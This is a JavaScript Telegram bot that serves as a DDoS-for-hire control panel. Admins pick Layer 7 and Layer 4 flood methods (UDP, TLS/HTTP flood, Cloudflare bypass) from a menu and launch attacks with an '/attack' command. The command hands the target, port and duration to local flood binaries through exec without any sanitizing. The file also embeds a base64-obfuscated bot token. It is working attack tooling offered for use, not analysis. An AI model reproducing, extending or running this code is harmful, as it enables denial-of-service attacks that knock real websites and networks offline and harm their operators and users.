/* CREDIT: t.me/nhatdz29 | OWNER: NHẬT ĐẸP TRAI */
const {exec}=require('child_process');const TelegramBot=require('node-telegram-bot-api');const dns=require('dns');const axios=require('axios');
const _0xADMINS = [8522281788]; 
const _0x1a2b3c = Buffer.from('ODcyNTYzMDE5MTpBQUhPd1RQRTExdGpIak9KMkpONDBIdWljVjBDOEdPZlU=', 'base64').toString();
const bot = new TelegramBot(_0x1a2b3c, {polling: true});
let _0x55aa = []; const _0x99bb = Date.now();
const _0x44cc = 'https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJueXF6bmZ6bmZ6bmZ6bmZ6bmZ6bmZ6bmZ6bmZ6bmZ6bmZ6bmZ6JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/l41lTjJp9p6m8nKms/giphy.gif';
const _0xmenu = {reply_markup: {inline_keyboard: [[{text: "🚀 L7", callback_data: 'm_l7'}, {text: "🛡 L4", callback_data: 'm_l4'}],[{text: "📊 ONGOING", callback_data: 'ongoing'}, {text: "ℹ INFO", callback_data: 'info_server'}],[{text: "⏱ UPTIME", callback_data: 'uptime'}, {text: "🛑 STOP", callback_data: 'stop'}],[{text: "👑 OWNER", url: 'https://t.me/nhatdz29'}]]}};
function _0xisAdm(id) { return _0xADMINS.includes(id); }
bot.onText(/\/(start|help)/, (msg) => {
    if(!_0xisAdm(msg.from.id)) return bot.sendMessage(msg.chat.id, "❌ Cút!");
    bot.sendMessage(msg.chat.id, "⚔ **NETHERSTAR PANEL**\nChào Đại ca **Nhật đẹp trai**!", _0xmenu);
});
bot.on('callback_query', async (q) => {
    const cid = q.message.chat.id; if(!_0xisAdm(q.from.id)) return;
    const d = q.data;
    if (d === 'm_l7') bot.sendMessage(cid, "🔥 **L7:** `vip-browser, tls, uam, cf-bypass, post-load`\n`/attack <URL> 80 <Time> <Method>`");
    if (d === 'm_l4') bot.sendMessage(cid, "🛡 **L4:** `udp, vulkan, ack, stomp`\n`/attack <IP> <Port> <Time> <Method>`");
    if (d === 'stop') { exec("pkill -f node; pkill -f python3; pkill -f udp_flood; pkill -f vulkan_udp"); _0x55aa = []; bot.sendMessage(cid, "🛑 STOPPED!"); }
    if (d === 'ongoing') { let t = "🔥 **ONGOING:**\n"; _0x55aa.forEach((a, i) => { t += `${i+1}. 🎯 \`${a.target}\`\n`; }); bot.sendMessage(cid, t || "⭕ Empty"); }
});
bot.onText(/\/attack (.+) (.+) (.+) (.+)/, async (msg, match) => {
    if(!_0xisAdm(msg.from.id)) return;
    const [_, target, port, time, method] = match;
    const m = method.toLowerCase();
    const _0xcmds = { 'udp': `./udp_flood ${target} ${port} ${time}`, 'vulkan': `sudo ./vulkan_udp ${target} ${port} ${time}`, 'vip-browser': `node vip_browser_v2.js ${target} ${time}`, 'tls': `node http_flood.js ${target} ${time}` };
    if (_0xcmds[m]) {
        _0x55aa.push({target}); setTimeout(() => { _0x55aa = _0x55aa.filter(a => a.target !== target); }, time * 1000);
        await bot.sendAnimation(msg.chat.id, _0x44cc, { caption: `🚀 **ATTACKING!**\n🎯 Target: \`${target}\`\n⚡ Method: \`${m.toUpperCase()}\`\n⏱ Time: \`${time}s\`\n👤 By: Nhật đẹp trai`, parse_mode: 'Markdown' });
        exec(_0xcmds[m]);
    }
});

